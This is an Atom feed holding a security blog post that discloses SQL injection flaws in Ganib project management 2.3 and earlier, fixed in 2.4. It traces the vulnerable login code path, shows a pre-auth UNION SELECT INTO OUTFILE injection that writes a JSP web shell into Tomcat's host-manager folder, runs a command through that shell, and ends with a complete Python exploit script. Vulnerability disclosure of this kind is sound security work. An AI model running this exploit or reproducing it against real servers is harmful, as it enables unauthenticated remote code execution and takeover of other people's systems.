<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ganib | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/ganib/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2019-08-22T10:30:15-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T21:03:07-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<p>```
String theme = request.getParameter(&ldquo;theme&rdquo;);
User user = (User) pageContext.getAttribute(&ldquo;user&rdquo;, PageContext.SESSION_SCOPE);
if( user != null &amp;&amp; user.getID() != null ) {</p>

<pre><code>DBBean db = new DBBean();

try {
    String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
    db.prepareStatement(query);
    db.executePrepared();
} finally {
    db.release();
}
</code></pre>

<p>```</p>

<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<p>```
// Grab parameters from Login form
String secure = request.getParameter (&ldquo;secure&rdquo;);
String username = request.getParameter (&ldquo;J_USERNAME&rdquo;);
username = username == null ? u_name : username;
String password = request.getParameter (&ldquo;J_PASSWORD&rdquo;);
password = password == null ? pwd : password;
String userDomain = request.getParameter(&ldquo;userDomain&rdquo;);</p>

<p>[&hellip;]</p>

<p>else</p>

<pre><code>loginManager.createLoginContext(username, password, userDomain);
</code></pre>

<p>```</p>

<p>And the request, for reference:</p>

<p>```
POST /LoginProcessing.jsp HTTP/1.1
Host: 192.168.1.219:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <a href="http://192.168.1.219:8080/">http://192.168.1.219:8080/</a>
Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; <em>sid=; </em>styp=; JSPRootURL=; cookies=true
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109</p>

<p>theAction=submit&amp;J_USERNAME=bob%40bob.com&amp;J_PASSWORD=password&amp;language=en&amp;remember_checkbox=on&amp;userDomain=1000
```</p>

<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<p>```
try
{</p>

<pre><code>domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
statusCode = LoginStatusCode.SUCCESS;
</code></pre>

<p>}
```</p>

<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg">http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg</a>"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<p>```
private DomainAuthenticator(String domainID, String username, String clearTextPassword)
  throws DomainException
{
  try
  {</p>

<pre><code>UserDomain domain = new UserDomain();
domain.setID(domainID);
domain.load();
setDomain(domain);

setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</code></pre>

<p>  }
```</p>

<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<p>```
 public void load()</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>DBBean db = new DBBean();
try
{
  load(db);
} finally {
  db.release();
}
</code></pre>

<p>  }</p>

<p>  public void load(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>loadProperties(db);

loadUsers(db);

loadSupportedConfigurations(db);
</code></pre>

<p>  }
```</p>

<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<p>```
 public void loadUsers(DBBean db)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>if (this.domainID == null) {
  throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
}

if (this.userCollection == null) {
  this.userCollection = new DomainUserCollection();
}

this.userCollection.setDomainID(getID());
this.userCollection.load(db);
</code></pre>

<p>  }
```</p>

<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<p>```
 protected void load(DBBean dbean)</p>

<pre><code>throws PersistenceException
</code></pre>

<p>  {</p>

<pre><code>String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();

if (this.domainID == null) {
  throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
}
</code></pre>

<p>  [&hellip;]</p>

<p>  dbean.executeQuery(qstrLoadUsersForDomain);
```</p>

<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<p>```
root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
[!] Dropping ./cmd.jsp on 192.168.1.64&hellip;
[!] Dropped at /wjdll.jsp
root@jali:~/exploits# python -c &lsquo;import requests; print requests.get(&ldquo;<a href="http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd">http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd</a>&rdquo;).content&rsquo;</p>

<p>/var/www/ganib/tomcat/bin</p>

<pre><code>1    2    3
</code></pre>

<p>root@jali:~/exploits#
```</p>

<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<p>```</p>

<h1>Exploit title: Ganib 2.0 SQLi</h1>

<h1>Date: 02/02/2014</h1>

<h1>Exploit author: drone (@dronesec)</h1>

<h1>More information:</h1>

<h1>Vendor homepage: <a href="http://www.ganib.com/">http://www.ganib.com/</a></h1>

<h1>Software link: <a href="http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip">http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip</a></h1>

<h1>Version: &lt;= 2.3</h1>

<h1>Fixed in: 2.4</h1>

<h1>Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3</h1>

<p>from argparse import ArgumentParser
import sys
import string
import random
import requests</p>

<p>&ldquo;&rdquo;&ldquo; Ganib 2.0 preauth SQLi PoC</p>

<pre><code>@dronesec
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>def loadJSP(options):</p>

<pre><code>data = ''

try:
    with open(options.jsp) as f:
        for line in f.readlines():
            data += line.replace("\"", "\\\"").replace('\n', '')
except Exception, e:
    print e
    sys.exit(1)

return data
</code></pre>

<p>def run(options):</p>

<pre><code>print '[!] Dropping %s on %s...' % (options.jsp, options.ip)

url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)

data = { "theAction" : "submit",
         "J_USERNAME" : "test",
         "J_PASSWORD" : "test",
         "language" : "en",
         "remember_checkbox" : "on",
         "userDomain" : exploit
       }

res = requests.post(url, data=data)
if res.status_code is 200:
    print '[!] Dropped at /{0}.jsp'.format(shell)
else:
    print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</code></pre>

<p>def parse():</p>

<pre><code>parser = ArgumentParser()
parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
                    required=True)
parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
                    action='store', default='/var/www/ganib')
parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')

options = parser.parse_args()
options.path = options.path if options.path[-1] != '/' else options.path[:-1]
return options
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>run(parse())
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
